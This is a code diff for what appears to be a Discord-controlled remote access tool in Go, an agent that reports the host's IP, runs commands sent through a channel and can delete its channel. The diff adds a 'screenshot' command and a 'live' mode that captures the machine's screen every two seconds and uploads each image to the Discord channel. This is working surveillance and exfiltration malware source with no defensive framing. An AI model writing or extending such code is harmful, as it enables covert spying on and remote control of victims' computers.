@@ -21,6 +21,8 @@ import (
 
 var newAgent *agent.Agent
 var channelID *discordgo.Channel
+var liveStreamActive bool
+var lastMessageID string
 
 // Create an Agent with all the necessary information
 func init() {
@@ -142,7 +144,38 @@ func messageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) {
 
 	if !message.Author.Bot {
 		if message.ChannelID == channelID.ID {
-			if message.Content == "ping" {
+			if message.Content == "live" && !liveStreamActive {
+				liveStreamActive = true
+				dg.ChannelMessageSend(message.ChannelID, "Live display share started!")
+				go startLiveDisplayShare(dg)
+			}else if message.Content == "stop" && liveStreamActive {
+				liveStreamActive = false
+				dg.ChannelMessageSend(message.ChannelID, "Live display share stopped!")
+			}else if message.Content == "screenshot" {
+				fileName, err := util.CaptureScreenshot()
+				if err != nil {
+					dg.ChannelMessageSend(message.ChannelID, "Failed to capture screenshot: "+err.Error())
+					return
+				}
+			
+				file, err := os.Open(fileName)
+				if err != nil {
+					dg.ChannelMessageSend(message.ChannelID, "Failed to open screenshot file: "+err.Error())
+					return
+				}
+				defer file.Close()
+			
+				_, err = dg.ChannelFileSend(message.ChannelID, fileName, file)
+				if err != nil {
+					dg.ChannelMessageSend(message.ChannelID, "Failed to send screenshot: "+err.Error())
+					return
+				}
+				dg.ChannelMessageSend(message.ChannelID, "Screenshot captured and sent!")
+				err = os.Remove(fileName)
+				if err != nil {
+					dg.ChannelMessageSend(channelID.ID, "Failed to delete screenshot: "+err.Error())
+				}
+			} else if message.Content == "ping" {
 				dg.ChannelMessageSend(message.ChannelID, "I'm alive bruv")
 			} else if message.Content == "kill" {
 				dg.ChannelDelete(channelID.ID)
@@ -249,6 +282,51 @@ func messageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) {
 	}
 }
 
+// Function to start live display sharing (continuous screenshot capture)
+func startLiveDisplayShare(dg *discordgo.Session) {
+	for liveStreamActive {
+		// Capture a screenshot every 2 seconds (adjust timing as needed)
+		fileName, err := util.CaptureScreenshot()
+		if err != nil {
+			dg.ChannelMessageSend(channelID.ID, "Failed to capture screenshot: "+err.Error())
+			return
+		}
+
+		file, err := os.Open(fileName)
+		if err != nil {
+			dg.ChannelMessageSend(channelID.ID, "Failed to open screenshot file: "+err.Error())
+			return
+		}
+		defer file.Close()
+
+		// If there's an old message with an image, delete it
+		// if lastMessageID != "" {
+		// 	dg.ChannelMessageDelete(channelID.ID, lastMessageID)
+		// }
+
+		// Send the new screenshot to Discord channel
+		message, err := dg.ChannelFileSend(channelID.ID, fileName, file)
+		if err != nil {
+			dg.ChannelMessageSend(channelID.ID, "Failed to send screenshot: "+err.Error())
+			return
+		}
+		file.Close()
+		// Store the ID of the message with the new image
+		lastMessageID = message.ID
+
+		//dg.ChannelMessageSend(channelID.ID, "Live display stream: Screenshot sent!")
+
+		// Remove the screenshot file after sending it
+		err = os.Remove(fileName)
+		if err != nil {
+			dg.ChannelMessageSend(channelID.ID, "Failed to delete screenshot: "+err.Error())
+		}
+
+		// Wait for 2 seconds before the next screenshot
+		time.Sleep(2 * time.Second)
+	}
+}
+
 func heartBeat(dg *discordgo.Session) {
 	dg.ChannelMessageSend(channelID.ID, fmt.Sprintf("!heartbeat %v", newAgent.IP))
 }
@@ -268,6 +346,7 @@ func executeCommand(command string) string {
 	}
 
 	// Seperate args from command
+	fmt.Printf("Executing command: %s\n", command)
 	ss := strings.Split(command, " ")
 	command = ss[0]
 
